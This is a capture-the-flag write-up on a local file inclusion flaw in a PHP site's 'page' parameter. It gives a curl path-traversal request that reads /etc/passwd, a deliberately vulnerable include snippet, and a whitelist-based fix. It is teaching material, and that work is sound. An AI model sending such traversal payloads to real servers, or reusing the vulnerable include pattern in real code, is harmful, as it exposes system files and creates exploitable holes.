# LFI in page url parameter

## 📖 Vulnerability Explanation
An LFI vulnerability happens when the user's input is not properly sanitized and is used to load a file from the filesystem. This leads to the ability to read files out of the web application directory, such as `/etc/passwd`.

As the web page uses the parameter `?page=<filename>` to load the different pages in the app, we can escape the application directory by using a relative path to the file `/etc/passwd`.

## ⚙️ Exploitation Process
Setting the page to the relative path of the ```/etc/passwd``` file displays the flag.

- Make this request with ```curl``` and get the flag:
```
curl -s 'http://BornToSec.com/index.php?page=../../../../../../../etc/passwd' | grep flag
```

## 🔧 Fix
Defining a whitelist of pages is the best practice. We can also sanitize the input, allowing only alphanumeric characters.

## ☝️🤓 Advanced explanation
The following code snipped is vulnerable to an LFI. The vulnerability happens because the file is accessed without previous checking. If the user inputs a relative route to files out of the web app directory, the web page will access it.

```
<?php

if (isset($_GET['page'])) {
    include($_GET['page'] . '.php');
} else {
    include('home.php');
}

?>
```

In order to fix it, we'll apply a whitelist and character filtering.

```
<?php

$whitelist = ['home', 'about', 'contact'];

$pageToInclude = 'home.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];

    if (preg_match('/^[a-zA-Z0-9]+$/', $page) && in_array($page, $whitelist)) {
        $pageToInclude = $page . '.php';
    }
}

include($pageToInclude);

?>
```